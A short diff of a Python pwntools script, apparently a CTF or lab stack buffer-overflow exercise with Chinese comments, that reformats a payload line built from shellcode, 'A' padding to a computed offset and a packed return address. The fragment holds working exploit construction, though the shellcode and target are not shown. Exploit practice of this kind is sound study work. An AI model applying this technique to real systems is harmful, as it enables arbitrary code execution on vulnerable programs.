@@ -1,6 +1,5 @@
-##coding=utf8
+
 from pwn import *
-## 构造与程序交互的对象
 
 def main():
 
@@ -13,7 +12,9 @@ def main():
     offset = 0xffffd028 - 0xffffcfbc + 4
 
     ## 构造payload
-    payload = shellcode.decode('unicode_escape') + 'A' * (offset - len(shellcode)) + p32(buf_addr).decode('unicode_escape')
+    payload = shellcode.decode('unicode_escape') + \
+        'A' * (offset - len(shellcode)) + \
+        p32(buf_addr).decode('unicode_escape')
     print (payload)
 
     ## 向程序发送字符串
